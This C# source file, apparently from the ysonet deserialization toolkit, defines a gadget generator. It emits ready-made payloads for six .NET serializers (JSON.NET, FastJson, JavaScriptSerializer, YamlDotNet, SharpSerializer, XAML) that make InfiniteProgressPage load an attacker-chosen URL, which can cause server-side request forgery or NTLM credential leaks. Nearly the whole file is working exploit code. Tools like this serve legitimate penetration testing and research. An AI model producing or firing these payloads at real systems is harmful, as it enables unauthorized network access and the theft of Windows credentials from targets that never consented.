using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// Microsoft.ApplicationId.Framework.InfiniteProgressPage.AnimatedPictureFile loads the
    /// supplied URL. The target needs the Microsoft.ApplicationId.Framework assembly.
    ///
    /// Everything this gadget emits lives in this file: the target type names and every
    /// formatter template. Nothing about InfiniteProgressPage belongs in a helper or in a
    /// shared payload builder.
    /// </summary>
    public class InfiniteProgressPageGenerator : GenericGenerator
    {
        private bool rawInput;

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework)
                // fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Microsoft.ApplicationId.Framework.InfiniteProgressPage loads the supplied HTTP, HTTPS, FTP, or file URL through AnimatedPictureFile. This can trigger SSRF or NTLM authentication. The target needs Microsoft.ApplicationId.Framework.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // No MessagePack here, unlike the other two URL-loading setter gadgets: the surrogate
        // technique would apply the same way, but the combination has not been reproduced for
        // this target, so it is not advertised.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                Formatters.SharpSerializerXml,
                Formatters.Xaml
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            return FinishHandWrittenPayload(BuildPayload(inputArgs.Cmd, formatter), formatter, inputArgs);
        }

        private object BuildPayload(string input, string formatter)
        {
            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    '$type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    '__type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        ""Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"":""1""
    },
    ""$type"":""1"",
    ""AnimatedPictureFile"":""" + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                return @"
!<!Microsoft.ApplicationId.Framework.InfiniteProgressPage,Microsoft.ApplicationId.Framework,Version=10.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    AnimatedPictureFile: """ + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""Microsoft.ApplicationId.Framework.InfiniteProgressPage,Microsoft.ApplicationId.Framework,Version=10.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35"">
    <Properties>
        <Simple name=""AnimatedPictureFile"" value=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                return @"
<InfiniteProgressPage AnimatedPictureFile=""" + EscapeForXmlAttribute(input, rawInput) + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</InfiniteProgressPage>
";
            }

            throw UnsupportedFormatter(formatter);
        }
    }
}
